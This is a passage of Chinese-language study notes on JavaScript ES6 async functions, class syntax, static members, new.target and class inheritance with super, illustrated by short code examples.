对象再跟一个catch方法，处理前面可能出现的错误。\r\n\t\t- async function f() {\r\n  await Promise.reject('出错了')\r\n    .catch(e => console.log(e));\r\n  return await Promise.resolve('hello world');\r\n}\r\n\r\nf()\r\n.then(v => console.log(v))\r\n// 出错了\r\n// hello world\r\n\r\n- 错误处理\r\n\r\n\t- 如果await后面的异步操作出错，那么等同于async函数返回的 Promise 对象被reject。\r\n\r\n\t\t- async function f() {\r\n  await new Promise(function (resolve, reject) {\r\n    throw new Error('出错了');\r\n  });\r\n}\r\n\r\nf()\r\n.then(v => console.log(v))\r\n.catch(e => console.log(e))\r\n// Error：出错了\r\n\t\t- 上面代码中，async函数f执行后，await后面的 Promise 对象会抛出一个错误对象，导致catch方法的回调函数被调用，它的参数就是抛出的错误对象。具体的执行机制，可以参考后文的“async 函数的实现原理”。\r\n\t\t- 防止出错的方法，也是将其放在try...catch代码块之中\r\n\t\t- async function f() {\r\n  try {\r\n    await new Promise(function (resolve, reject) {\r\n      throw new Error('出错了');\r\n    });\r\n  } catch(e) {\r\n  }\r\n  return await('hello world');\r\n}\r\n\t\t- 如果有多个await命令，可以统一放在try...catch结构中。\r\n\t\t- async function main() {\r\n  try {\r\n    const val1 = await firstStep();\r\n    const val2 = await secondStep(val1);\r\n    const val3 = await thirdStep(val1, val2);\r\n\r\n    console.log('Final: ', val3);\r\n  }\r\n  catch (err) {\r\n    console.error(err);\r\n  }\r\n}\r\n\r\n- 使用注意点\r\n\r\n\t- 第一点，前面已经说过，await命令后面的Promise对象，运行结果可能是rejected，所以最好把await命令放在try...catch代码块中。\r\n\r\n\t\t- async function myFunction() {\r\n  try {\r\n    await somethingThatReturnsAPromise();\r\n  } catch (err) {\r\n    console.log(err);\r\n  }\r\n}\r\n\r\n// 另一种写法\r\n\r\nasync function myFunction() {\r\n  await somethingThatReturnsAPromise()\r\n  .catch(function (err) {\r\n    console.log(err);\r\n  });\r\n}\r\n\r\n\t- 第二点，多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。\r\n\r\n\t\t- let foo = await getFoo();\r\nlet bar = await getBar();\r\n\t\t- 上面代码中，getFoo和getBar是两个独立的异步操作（即互不依赖），被写成继发关系。这样比较耗时，因为只有getFoo完成以后，才会执行getBar，完全可以让它们同时触发。\r\n\t\t- // 写法一\r\nlet [foo, bar] = await Promise.all([getFoo(), getBar()]);\r\n\r\n// 写法二\r\nlet fooPromise = getFoo();\r\nlet barPromise = getBar();\r\nlet foo = await fooPromise;\r\nlet bar = await barPromise;\r\n\t\t- 上面两种写法，getFoo和getBar都是同时触发，这样就会缩短程序的执行时间。\r\n\r\n\t- 第三点，await命令只能用在async函数之中，如果用在普通函数，就会报错。\r\n\r\n\t\t- async function dbFuc(db) {\r\n  let docs = [{}, {}, {}];\r\n\r\n  // 报错\r\n  docs.forEach(function (doc) {\r\n    await db.post(doc);\r\n  });\r\n}\r\n\t\t- 上面代码会报错，因为await用在普通函数之中了。但是，如果将forEach方法的参数改成async函数，也有问题。\r\n\t\t- function dbFuc(db) { //这里不需要 async\r\n  let docs = [{}, {}, {}];\r\n\r\n  // 可能得到错误结果\r\n  docs.forEach(async function (doc) {\r\n    await db.post(doc);\r\n  });\r\n}\r\n\t\t- 上面代码可能不会正常工作，原因是这时三个db.post操作将是并发执行，也就是同时执行，而不是继发执行。正确的写法是采用for循环。\r\n\t\t- async function dbFuc(db) {\r\n  let docs = [{}, {}, {}];\r\n\r\n  for (let doc of docs) {\r\n    await db.post(doc);\r\n  }\r\n}\r\n\r\n### async 函数的实现原理\r\n\r\n- async 函数的实现原理，就是将 Generator 函数和自动执行器，包装在一个函数里。\r\n\r\n\t- async function fn(args) {\r\n  // ...\r\n}\r\n\r\n// 等同于\r\n\r\nfunction fn(args) {\r\n  return spawn(function* () {\r\n    // ...\r\n  });\r\n}\r\n\t- 所有的async函数都可以写成上面的第二种形式，其中的spawn函数就是自动执行器。\r\n\t- spawn函数的实现，基本就是前文自动执行器的翻版\r\n\t- function spawn(genF) {\r\n  return new Promise(function(resolve, reject) {\r\n    const gen = genF();\r\n    function step(nextF) {\r\n      let next;\r\n      try {\r\n        next = nextF();\r\n      } catch(e) {\r\n        return reject(e);\r\n      }\r\n      if(next.done) {\r\n        return resolve(next.value);\r\n      }\r\n      Promise.resolve(next.value).then(function(v) {\r\n        step(function() { return gen.next(v); });\r\n      }, function(e) {\r\n        step(function() { return gen.throw(e); });\r\n      });\r\n    }\r\n    step(function() { return gen.next(undefined); });\r\n  });\r\n}\r\n\r\n## Class 的基本语法\r\n\r\n### 简介\r\n\r\n- JavaScript 语言中，生成实例对象的传统方法是通过构造函数\r\n\r\n\t- function Point(x, y) {\r\n  this.x = x;\r\n  this.y = y;\r\n}\r\n\r\nPoint.prototype.toString = function () {\r\n  return '(' + this.x + ', ' + this.y + ')';\r\n};\r\n\r\nvar p = new Point(1, 2);\r\n\t- 上面的代码用 ES6 的class改写，就是下面这样。\r\n\t- //定义类\r\nclass Point {\r\n  constructor(x, y) {\r\n    this.x = x;\r\n    this.y = y;\r\n  }\r\n\r\n  toString() {\r\n    return '(' + this.x + ', ' + this.y + ')';\r\n  }\r\n}\r\n\t- 定义“类”的方法的时候，前面不需要加上function这个关键字，直接把函数定义放进去了就可以了。另外，方法之间不需要逗号分隔，加了会报错。\r\n\r\n- ES6 的类，完全可以看作构造函数的另一种写法。\r\n\r\n\t- class Point {\r\n  // ...\r\n}\r\n\r\ntypeof Point // \"function\"\r\nPoint === Point.prototype.constructor // true\r\n\t- 上面代码表明，类的数据类型就是函数，类本身就指向构造函数。\r\n\t- 使用的时候，也是直接对类使用new命令，跟构造函数的用法完全一致。\r\n\t- 构造函数的prototype属性，在 ES6 的“类”上面继续存在。事实上，类的所有方法都定义在类的prototype属性上面。\r\n\r\n\t\t- class Point {\r\n  constructor() {\r\n    // ...\r\n  }\r\n\r\n  toString() {\r\n    // ...\r\n  }\r\n\r\n  toValue() {\r\n    // ...\r\n  }\r\n}\r\n\r\n// 等同于\r\n\r\nPoint.prototype = {\r\n  constructor() {},\r\n  toString() {},\r\n  toValue() {},\r\n};\r\n\r\n\t- 在类的实例上面调用方法，其实就是调用原型上的方法。\r\n\r\n\t\t- class B {}\r\nlet b = new B();\r\n\r\nb.constructor === B.prototype.constructor // true\r\n\t\t- 上面代码中，b是B类的实例，它的constructor方法就是B类原型的constructor方法。\r\n\r\n\t- 由于类的方法都定义在prototype对象上面，所以类的新方法可以添加在prototype对象上面。Object.assign方法可以很方便地一次向类添加多个方法。\r\n\r\n\t\t- class Point {\r\n  constructor(){\r\n    // ...\r\n  }\r\n}\r\n\r\nObject.assign(Point.prototype, {\r\n  toString(){},\r\n  toValue(){}\r\n});\r\n\r\n\t- prototype对象的constructor属性，直接指向“类”的本身，这与 ES5 的行为是一致的。\r\n\r\n\t\t- Point.prototype.constructor === Point // true\r\n\r\n\t- 另外，类的内部所有定义的方法，都是不可枚举的（non-enumerable）。\r\n\r\n\t\t- class Point {\r\n  constructor(x, y) {\r\n    // ...\r\n  }\r\n\r\n  toString() {\r\n    // ...\r\n  }\r\n}\r\n\r\nObject.keys(Point.prototype)\r\n// []\r\nObject.getOwnPropertyNames(Point.prototype)\r\n// [\"constructor\",\"toString\"]\r\n\t\t- 上面代码中，toString方法是Point类内部定义的方法，它是不可枚举的。这一点与 ES5 的行为不一致。\r\n\r\n- 类的属性名，可以采用表达式。\r\n\r\n\t- let methodName = 'getArea';\r\n\r\nclass Square {\r\n  constructor(length) {\r\n    // ...\r\n  }\r\n\r\n  [methodName]() {\r\n    // ...\r\n  }\r\n}\r\n\t- 上面代码中，Square类的方法名getArea，是从表达式得到的。\r\n\r\n### 严格模式\r\n\r\n- 类和模块的内部，默认就是严格模式，所以不需要使用use strict指定运行模式。只要你的代码写在类或模块之中，就只有严格模式可用。\r\n\r\n考虑到未来所有的代码，其实都是运行在模块之中，所以 ES6 实际上把整个语言升级到了严格模式。\r\n\r\n### constructor 方法\r\n\r\n- constructor方法是类的默认方法，通过new命令生成对象实例时，自动调用该方法。一个类必须有constructor方法，如果没有显式定义，一个空的constructor方法会被默认添加。\r\n\r\n\t- class Point {\r\n}\r\n\r\n// 等同于\r\nclass Point {\r\n  constructor() {}\r\n}\r\n\r\n- constructor方法默认返回实例对象（即this），完全可以指定返回另外一个对象。\r\n\r\n\t- class Foo {\r\n  constructor() {\r\n    return Object.create(null);\r\n  }\r\n}\r\n\r\nnew Foo() instanceof Foo\r\n// false\r\n\t- 上面代码中，constructor函数返回一个全新的对象，结果导致实例对象不是Foo类的实例。\r\n\r\n- 类必须使用new调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用new也可以执行。\r\n\r\n\t- class Foo {\r\n  constructor() {\r\n    return Object.create(null);\r\n  }\r\n}\r\n\r\nFoo()\r\n// TypeError: Class constructor Foo cannot be invoked without 'new'\r\n\r\n### 类的实例对象\r\n\r\n- 生成类的实例对象的写法，与 ES5 完全一样，也是使用new命令。前面说过，如果忘记加上new，像函数那样调用Class，将会报错。\r\n\r\n\t- class Point {\r\n  // ...\r\n}\r\n\r\n// 报错\r\nvar point = Point(2, 3);\r\n\r\n// 正确\r\nvar point = new Point(2, 3);\r\n\r\n- 与 ES5 一样，实例的属性除非显式定义在其本身（即定义在this对象上），否则都是定义在原型上（即定义在class上）。\r\n\r\n\t- //定义类\r\nclass Point {\r\n\r\n  constructor(x, y) {\r\n    this.x = x;\r\n    this.y = y;\r\n  }\r\n\r\n  toString() {\r\n    return '(' + this.x + ', ' + this.y + ')';\r\n  }\r\n\r\n}\r\n\r\nvar point = new Point(2, 3);\r\n\r\npoint.toString() // (2, 3)\r\n\r\npoint.hasOwnProperty('x') // true\r\npoint.hasOwnProperty('y') // true\r\npoint.hasOwnProperty('toString') // false\r\npoint.__proto__.hasOwnProperty('toString') // true\r\n\t- 上面代码中，x和y都是实例对象point自身的属性（因为定义在this变量上），所以hasOwnProperty方法返回true，而toString是原型对象的属性（因为定义在Point类上），所以hasOwnProperty方法返回false。这些都与 ES5 的行为保持一致。\r\n\t- 与 ES5 一样，类的所有实例共享一个原型对象。\r\n\r\n\t\t- var p1 = new Point(2,3);\r\nvar p2 = new Point(3,2);\r\n\r\np1.__proto__ === p2.__proto__\r\n//true\r\n\t\t- 上面代码中，p1和p2都是Point的实例，它们的原型都是Point.prototype，所以__proto__属性是相等的。\r\n\r\n这也意味着，可以通过实例的__proto__属性为“类”添加方法。\r\n\t\t- __proto__ 并不是语言本身的特性，这是各大厂商具体实现时添加的私有属性，虽然目前很多现代浏览器的 JS 引擎中都提供了这个私有属性，但依旧不建议在生产中使用该属性，避免对环境产生依赖。生产环境中，我们可以使用 Object.getPrototypeOf 方法来获取实例对象的原型，然后再来为原型添加方法/属性。\r\n\t\t- var p1 = new Point(2,3);\r\nvar p2 = new Point(3,2);\r\n\r\np1.__proto__.printName = function () { return 'Oops' };\r\n\r\np1.printName() // \"Oops\"\r\np2.printName() // \"Oops\"\r\n\r\nvar p3 = new Point(4,2);\r\np3.printName() // \"Oops\"\r\n\t\t- 上面代码在p1的原型上添加了一个printName方法，由于p1的原型就是p2的原型，因此p2也可以调用这个方法。而且，此后新建的实例p3也可以调用这个方法。这意味着，使用实例的__proto__属性改写原型，必须相当谨慎，不推荐使用，因为这会改变“类”的原始定义，影响到所有实例。\r\n\r\n### Class 表达式 \r\n\r\n- 与函数一样，类也可以使用表达式的形式定义。\r\n\r\n\t- const MyClass = class Me {\r\n  getClassName() {\r\n    return Me.name;\r\n  }\r\n};\r\n\t- 上面代码使用表达式定义了一个类。需要注意的是，这个类的名字是MyClass而不是Me，Me只在 Class 的内部代码可用，指代当前类。\r\n\t- let inst = new MyClass();\r\ninst.getClassName() // Me\r\nMe.name // ReferenceError: Me is not defined\r\n\t- 上面代码表示，Me只在 Class 内部有定义。\r\n\r\n如果类的内部没用到的话，可以省略Me，也就是可以写成下面的形式。\r\n\t- const MyClass = class { /* ... */ };\r\n\r\n- 采用 Class 表达式，可以写出立即执行的 Class。\r\n\r\n\t- let person = new class {\r\n  constructor(name) {\r\n    this.name = name;\r\n  }\r\n\r\n  sayName() {\r\n    console.log(this.name);\r\n  }\r\n}('张三');\r\n\r\nperson.sayName(); // \"张三\"\r\n\r\n### 不存在变量提升\r\n\r\n- 类不存在变量提升（hoist），这一点与 ES5 完全不同。\r\n\r\n\t- new Foo(); // ReferenceError\r\nclass Foo {}\r\n\t- 上面代码中，Foo类使用在前，定义在后，这样会报错，因为 ES6 不会把类的声明提升到代码头部。这种规定的原因与下文要提到的继承有关，必须保证子类在父类之后定义。\r\n\r\n- {\r\n  let Foo = class {};\r\n  class Bar extends Foo {\r\n  }\r\n}\r\n\r\n\t- 上面的代码不会报错，因为Bar继承Foo的时候，Foo已经有定义了。但是，如果存在class的提升，上面代码就会报错，因为class会被提升到代码头部，而let命令是不提升的，所以导致Bar继承Foo的时候，Foo还没有定义。\r\n\r\n### 私有方法和私有属性\r\n\r\n- 现有的方法\r\n\r\n\t- 私有方法是常见需求，但 ES6 不提供，只能通过变通方法模拟实现。\r\n\r\n一种做法是在命名上加以区别。\r\n\r\n\t\t- class Widget {\r\n\r\n  // 公有方法\r\n  foo (baz) {\r\n    this._bar(baz);\r\n  }\r\n\r\n  // 私有方法\r\n  _bar(baz) {\r\n    return this.snaf = baz;\r\n  }\r\n\r\n  // ...\r\n}\r\n\t\t- 上面代码中，_bar方法前面的下划线，表示这是一个只限于内部使用的私有方法。但是，这种命名是不保险的，在类的外部，还是可以调用到这个方法。\r\n\t\t- 另一种方法就是索性将私有方法移出模块，因为模块内部的所有方法都是对外可见的。\r\n\t\t- class Widget {\r\n  foo (baz) {\r\n    bar.call(this, baz);\r\n  }\r\n\r\n  // ...\r\n}\r\n\r\nfunction bar(baz) {\r\n  return this.snaf = baz;\r\n}\r\n\t\t- 上面代码中，foo是公有方法，内部调用了bar.call(this, baz)。这使得bar实际上成为了当前模块的私有方法。\r\n\t\t- 还有一种方法是利用Symbol值的唯一性，将私有方法的名字命名为一个Symbol值。\r\n\t\t- const bar = Symbol('bar');\r\nconst snaf = Symbol('snaf');\r\n\r\nexport default class myClass{\r\n\r\n  // 公有方法\r\n  foo(baz) {\r\n    this[bar](baz);\r\n  }\r\n\r\n  // 私有方法\r\n  [bar](baz) {\r\n    return this[snaf] = baz;\r\n  }\r\n\r\n  // ...\r\n};\r\n\t\t- 上面代码中，bar和snaf都是Symbol值，导致第三方无法获取到它们，因此达到了私有方法和私有属性的效果。\r\n\r\n### this 的指向 \r\n\r\n- 类的方法内部如果含有this，它默认指向类的实例。但是，必须非常小心，一旦单独使用该方法，很可能报错。\r\n\r\n\t- class Logger {\r\n  printName(name = 'there') {\r\n    this.print(`Hello ${name}`);\r\n  }\r\n\r\n  print(text) {\r\n    console.log(text);\r\n  }\r\n}\r\n\r\nconst logger = new Logger();\r\nconst { printName } = logger;\r\nprintName(); // TypeError: Cannot read property 'print' of undefined\r\n\r\n\t- 上面代码中，printName方法中的this，默认指向Logger类的实例。但是，如果将这个方法提取出来单独使用，this会指向该方法运行时所在的环境，因为找不到print方法而导致报错。\r\n\t- 一个比较简单的解决方法是，在构造方法中绑定this，这样就不会找不到print方法了。\r\n\t- class Logger {\r\n  constructor() {\r\n    this.printName = this.printName.bind(this);\r\n  }\r\n\r\n  // ...\r\n}\r\n\t- 另一种解决方法是使用箭头函数。\r\n\t- class Logger {\r\n  constructor() {\r\n    this.printName = (name = 'there') => {\r\n      this.print(`Hello ${name}`);\r\n    };\r\n  }\r\n\r\n  // ...\r\n}\r\n\r\n### name 属性 \r\n\r\n- 由于本质上，ES6 的类只是 ES5 的构造函数的一层包装，所以函数的许多特性都被Class继承，包括name属性。\r\n\r\n\t- class Point {}\r\nPoint.name // \"Point\"\r\n\r\n\t\t- name属性总是返回紧跟在class关键字后面的类名。\r\n\r\n### Class 的取值函数（getter）和存值函数（setter）\r\n\r\n- 与 ES5 一样，在“类”的内部可以使用get和set关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。\r\n\r\n\t- class MyClass {\r\n  constructor() {\r\n    // ...\r\n  }\r\n  get prop() {\r\n    return 'getter';\r\n  }\r\n  set prop(value) {\r\n    console.log('setter: '+value);\r\n  }\r\n}\r\n\r\nlet inst = new MyClass();\r\n\r\ninst.prop = 123;\r\n// setter: 123\r\n\r\ninst.prop\r\n// 'getter'\r\n\t- 上面代码中，prop属性有对应的存值函数和取值函数，因此赋值和读取行为都被自定义了\r\n\r\n- 存值函数和取值函数是设置在属性的 Descriptor 对象上的。\r\n\r\n\t- class CustomHTMLElement {\r\n  constructor(element) {\r\n    this.element = element;\r\n  }\r\n\r\n  get html() {\r\n    return this.element.innerHTML;\r\n  }\r\n\r\n  set html(value) {\r\n    this.element.innerHTML = value;\r\n  }\r\n}\r\n\r\nvar descriptor = Object.getOwnPropertyDescriptor(\r\n  CustomHTMLElement.prototype, \"html\"\r\n);\r\n\r\n\"get\" in descriptor  // true\r\n\"set\" in descriptor  // true\r\n\t- 上面代码中，存值函数和取值函数是定义在html属性的描述对象上面，这与 ES5 完全一致。\r\n\r\n### Class 的 Generator 方法\r\n\r\n- 如果某个方法之前加上星号（*），就表示该方法是一个 Generator 函数。\r\n\r\n\t- class Foo {\r\n  constructor(...args) {\r\n    this.args = args;\r\n  }\r\n  * [Symbol.iterator]() {\r\n    for (let arg of this.args) {\r\n      yield arg;\r\n    }\r\n  }\r\n}\r\n\r\nfor (let x of new Foo('hello', 'world')) {\r\n  console.log(x);\r\n}\r\n// hello\r\n// world\r\n\t- 上面代码中，Foo类的Symbol.iterator方法前有一个星号，表示该方法是一个 Generator 函数。Symbol.iterator方法返回一个Foo类的默认遍历器，for...of循环会自动调用这个遍历器。\r\n\r\n### Class 的静态方法\r\n\r\n- 类相当于实例的原型，所有在类中定义的方法，都会被实例继承。如果在一个方法前，加上static关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。\r\n\r\n\t- class Foo {\r\n  static classMethod() {\r\n    return 'hello';\r\n  }\r\n}\r\n\r\nFoo.classMethod() // 'hello'\r\n\r\nvar foo = new Foo();\r\nfoo.classMethod()\r\n// TypeError: foo.classMethod is not a function\r\n\t- 上面代码中，Foo类的classMethod方法前有static关键字，表明该方法是一个静态方法，可以直接在Foo类上调用（Foo.classMethod()），而不是在Foo类的实例上调用。如果在实例上调用静态方法，会抛出一个错误，表示不存在该方法。\r\n\t- 注意，如果静态方法包含this关键字，这个this指的是类，而不是实例。\r\n\t- class Foo {\r\n  static bar () {\r\n    this.baz();\r\n  }\r\n  static baz () {\r\n    console.log('hello');\r\n  }\r\n  baz () {\r\n    console.log('world');\r\n  }\r\n}\r\n\r\nFoo.bar() // hello\r\n\t- 上面代码中，静态方法bar调用了this.baz，这里的this指的是Foo类，而不是Foo的实例，等同于调用Foo.baz。另外，从这个例子还可以看出，静态方法可以与非静态方法重名。\r\n\t- 父类的静态方法，可以被子类继承。\r\n\t- class Foo {\r\n  static classMethod() {\r\n    return 'hello';\r\n  }\r\n}\r\n\r\nclass Bar extends Foo {\r\n}\r\n\r\nBar.classMethod() // 'hello'\r\n\t- 上面代码中，父类Foo有一个静态方法，子类Bar可以调用这个方法。\r\n\t- 静态方法也是可以从super对象上调用的。\r\n\t- class Foo {\r\n  static classMethod() {\r\n    return 'hello';\r\n  }\r\n}\r\n\r\nclass Bar extends Foo {\r\n  static classMethod() {\r\n    return super.classMethod() + ', too';\r\n  }\r\n}\r\n\r\nBar.classMethod() // \"hello, too\"\r\n\r\n### Class 的静态属性和实例属性\r\n\r\n- 静态属性指的是 Class 本身的属性，即Class.propName，而不是定义在实例对象（this）上的属性。\r\n\r\n\t- class Foo {\r\n}\r\n\r\nFoo.prop = 1;\r\nFoo.prop // 1\r\n\t- 目前，只有这种写法可行，因为 ES6 明确规定，Class 内部只有静态方法，没有静态属性。\r\n\t- // 以下两种写法都无效\r\nclass Foo {\r\n  // 写法一\r\n  prop: 2\r\n\r\n  // 写法二\r\n  static prop: 2\r\n}\r\n\r\nFoo.prop // undefined\r\n\r\n- 目前有一个静态属性的提案，对实例属性和静态属性都规定了新的写法。\r\n\r\n\t- （1）类的实例属性\r\n\r\n\t\t- 类的实例属性可以用等式，写入类的定义之中。\r\n\r\n\t\t\t- class MyClass {\r\n  myProp = 42;\r\n\r\n  constructor() {\r\n    console.log(this.myProp); // 42\r\n  }\r\n}\r\n\t\t\t- 上面代码中，myProp就是MyClass的实例属性。在MyClass的实例上，可以读取这个属性。\r\n\t\t\t- 以前，我们定义实例属性，只能写在类的constructor方法里面。\r\n\t\t\t- class ReactCounter extends React.Component {\r\n  constructor(props) {\r\n    super(props);\r\n    this.state = {\r\n      count: 0\r\n    };\r\n  }\r\n}\r\n\t\t\t- 有了新的写法以后，可以不在constructor方法里面定义。\r\n\t\t\t- class ReactCounter extends React.Component {\r\n  state = {\r\n    count: 0\r\n  };\r\n}\r\n\r\n\t- 类的静态属性\r\n\r\n\t\t- 类的静态属性只要在上面的实例属性写法前面，加上static关键字就可以了。\r\n\r\n\t\t\t- class MyClass {\r\n  static myStaticProp = 42;\r\n\r\n  constructor() {\r\n    console.log(MyClass.myStaticProp); // 42\r\n  }\r\n}\r\n\r\n\t\t- 同样的，这个新写法大大方便了静态属性的表达。\r\n\r\n\t\t\t- // 老写法\r\nclass Foo {\r\n  // ...\r\n}\r\nFoo.prop = 1;\r\n\r\n// 新写法\r\nclass Foo {\r\n  static prop = 1;\r\n}\r\n\t\t\t- 上面代码中，老写法的静态属性定义在类的外部。整个类生成以后，再生成静态属性。这样让人很容易忽略这个静态属性，也不符合相关代码应该放在一起的代码组织原则。另外，新写法是显式声明（declarative），而不是赋值处理，语义更好。\r\n\r\n### new.target 属性\r\n\r\n- new是从构造函数生成实例对象的命令。ES6 为new命令引入了一个new.target属性，该属性一般用在构造函数之中，返回new命令作用于的那个构造函数。如果构造函数不是通过new命令调用的，new.target会返回undefined，因此这个属性可以用来确定构造函数是怎么调用的。\r\n\r\n\t- function Person(name) {\r\n  if (new.target !== undefined) {\r\n    this.name = name;\r\n  } else {\r\n    throw new Error('必须使用 new 命令生成实例');\r\n  }\r\n}\r\n\r\n// 另一种写法\r\nfunction Person(name) {\r\n  if (new.target === Person) {\r\n    this.name = name;\r\n  } else {\r\n    throw new Error('必须使用 new 命令生成实例');\r\n  }\r\n}\r\n\r\nvar person = new Person('张三'); // 正确\r\nvar notAPerson = Person.call(person, '张三');  // 报错\r\n\t- 上面代码确保构造函数只能通过new命令调用。\r\n\r\n- Class 内部调用new.target，返回当前 Class。\r\n\r\n\t- class Rectangle {\r\n  constructor(length, width) {\r\n    console.log(new.target === Rectangle);\r\n    this.length = length;\r\n    this.width = width;\r\n  }\r\n}\r\n\r\nvar obj = new Rectangle(3, 4); // 输出 true\r\n\r\n- 需要注意的是，子类继承父类时，new.target会返回子类。\r\n\r\n\t- 利用这个特点，可以写出不能独立使用、必须继承后才能使用的类。\r\n\r\n\t\t- class Shape {\r\n  constructor() {\r\n    if (new.target === Shape) {\r\n      throw new Error('本类不能实例化');\r\n    }\r\n  }\r\n}\r\n\r\nclass Rectangle extends Shape {\r\n  constructor(length, width) {\r\n    super();\r\n    // ...\r\n  }\r\n}\r\n\r\nvar x = new Shape();  // 报错\r\nvar y = new Rectangle(3, 4);  // 正确\r\n\t\t- 上面代码中，Shape类不能被实例化，只能用于继承。\r\n\r\n注意，在函数外部，使用new.target会报错。\r\n\r\n## Class 的继承\r\n\r\n### 简介\r\n\r\n- Class 可以通过extends关键字实现继承，这比 ES5 的通过修改原型链实现继承，要清晰和方便很多。\r\n\r\n\t- class Point {\r\n}\r\n\r\nclass ColorPoint extends Point {\r\n}\r\n\t- 上面代码定义了一个ColorPoint类，该类通过extends关键字，继承了Point类的所有属性和方法。但是由于没有部署任何代码，所以这两个类完全一样，等于复制了一个Point类。下面，我们在ColorPoint内部加上代码。\r\n\t- class ColorPoint extends Point {\r\n  constructor(x, y, color) {\r\n    super(x, y); // 调用父类的constructor(x, y)\r\n    this.color = color;\r\n  }\r\n\r\n  toString() {\r\n    return this.color + ' ' + super.toString(); // 调用父类的toString()\r\n  }\r\n}\r\n\t- 上面代码中，constructor方法和toString方法之中，都出现了super关键字，它在这里表示父类的构造函数，用来新建父类的this对象。\r\n\t- 子类必须在constructor方法中调用super方法，否则新建实例时会报错。这是因为子类自己的this对象，必须先通过父类的构造函数完成塑造，得到与父类同样的实例属性和方法，然后再对其进行加工，加上子类自己的实例属性和方法。如果不调用super方法，子类就得不到this对象。\r\n\t- class Point { /* ... */ }\r\n\r\nclass ColorPoint extends Point {\r\n  constructor() {\r\n  }\r\n}\r\n\r\nlet cp = new ColorPoint(); // ReferenceError\r\n\t- 上面代码中，ColorPoint继承了父类Point，但是它的构造函数没有调用super方法，导致新建实例时报错。\r\n\t- ES5 的继承，实质是先创造子类的实例对象this，然后再将父类的方法添加到this上面（Parent.apply(this)）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到this上面（所以必须先调用super方法），然后再用子类的构造函数修改this。\r\n\t- 如果子类没有定义constructor方法，这个方法会被默认添加，代码如下。也就是说，不管有没有显式定义，任何一个子类都有constructor方法。\r\n\r\n\t\t- class ColorPoint extends Point {\r\n}\r\n\r\n// 等同于\r\nclass ColorPoint extends Point {\r\n  constructor(...args) {\r\n    super(...args);\r\n  }\r\n}\r\n\r\n\t- 另一个需要注意的地方是，在子类的构造函数中，只有调用super之后，才可以使用this关键字，否则会报错。这是因为子类实例的构建，基于父类实例，只有super方法才能调用父类实例。\r\n\r\n\t\t- class Point {\r\n  constructor(x, y) {\r\n    this.x = x;\r\n    this.y = y;\r\n  }\r\n}\r\n\r\nclass ColorPoint extends Point {\r\n  constructor(x, y, color) {\r\n    this.color = color; // ReferenceError\r\n    super(x, y);\r\n    this.color = color; // 正确\r\n  }\r\n}\r\n\t\t- 上面代码中，子类的constructor方法没有调用super之前，就使用this关键字，结果报错，而放在super方法之后就是正确的。\r\n\t\t- 下面是生成子类实例的代码。\r\n\t\t- let cp = new ColorPoint(25, 8, 'green');\r\n\r\ncp instanceof ColorPoint // true\r\ncp instanceof Point // true\r\n\t\t- 上面代码中，实例对象cp同时是ColorPoint和Point两个类的实例，这与 ES5 的行为完全一致。\r\n\t\t- 最后，父类的静态方法，也会被子类继承。\r\n\t\t- class A {\r\n  static hello() {\r\n    console.log('hello world');\r\n  }\r\n}\r\n\r\nclass B extends A {\r\n}\r\n\r\nB.hello()  // hello world\r\n\t\t- 上面代码中，hello()是A类的静态方法，B继承A，也继承了A的静态方法。\r\n\r\n### Object.getPrototypeOf()\r\n\r\n- Object.getPrototypeOf方法可以用来从子类上获取父类。\r\n\r\n\t- Object.getPrototypeOf(ColorPoint) === Point\r\n// true\r\n\t- 因此，可以使用这个方法判断，一个类是否继承了另一个类。\r\n\r\n### super 关键字\r\n\r\n- super这个关键字，既可以当作函数使用，也可以当作对象使用。在这两种情况下，它的用法完全不同。\r\n\r\n\t- 第一种情况，super作为函数调用时，代表父类的构造函数。ES6 要求，子类的构造函数必须执行一次super函数。\r\n\r\n\t\t- class A {}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n  }\r\n}\r\n\t\t- 上面代码中，子类B的构造函数之中的super()，代表调用父类的构造函数。这是必须的，否则 JavaScript 引擎会报错。\r\n\t\t- 注意，super虽然代表了父类A的构造函数，但是返回的是子类B的实例，即super内部的this指的是B，因此super()在这里相当于A.prototype.constructor.call(this)。\r\n\t\t- class A {\r\n  constructor() {\r\n    console.log(new.target.name);\r\n  }\r\n}\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n  }\r\n}\r\nnew A() // A\r\nnew B() // B\r\n\t\t- 上面代码中，new.target指向当前正在执行的函数。可以看到，在super()执行时，它指向的是子类B的构造函数，而不是父类A的构造函数。也就是说，super()内部的this指向的是B。\r\n\t\t- 作为函数时，super()只能用在子类的构造函数之中，用在其他地方就会报错。\r\n\t\t- class A {}\r\n\r\nclass B extends A {\r\n  m() {\r\n    super(); // 报错\r\n  }\r\n}\r\n\r\n\t- 第二种情况，super作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。\r\n\r\n\t\t- class A {\r\n  p() {\r\n    return 2;\r\n  }\r\n}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    console.log(super.p()); // 2\r\n  }\r\n}\r\n\r\nlet b = new B();\r\n\t\t- 上面代码中，子类B当中的super.p()，就是将super当作一个对象使用。这时，super在普通方法之中，指向A.prototype，所以super.p()就相当于A.prototype.p()。\r\n\t\t- ES6 规定，在子类普通方法中通过super调用父类的方法时，方法内部的this指向当前的子类实例。\r\n\t\t- class A {\r\n  constructor() {\r\n    this.x = 1;\r\n  }\r\n  print() {\r\n    console.log(this.x);\r\n  }\r\n}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    this.x = 2;\r\n  }\r\n  m() {\r\n    super.print();\r\n  }\r\n}\r\n\r\nlet b = new B();\r\nb.m() // 2\r\n\t\t- 上面代码中，super.print()虽然调用的是A.prototype.print()，但是A.prototype.print()内部的this指向子类B的实例，导致输出的是2，而不是1。也就是说，实际上执行的是super.print.call(this)。\r\n\r\n由于this指向子类实例，所以如果通过super对某个属性赋值，这时super就是this，赋值的属性会变成子类实例的属性。\r\n\t\t- class A {\r\n  constructor() {\r\n    this.x = 1;\r\n  }\r\n}\r\n\r\nclass B extends A {\r\n  constructor() {\r\n    super();\r\n    this.x = 2;\r\n    super.x = 3;\r\n    console.log(super.x); // undefined\r\n    console.log(this.x); // 3\r\n  }\r\n}\r\n\r\nlet b = new B();\r\n\t\t- 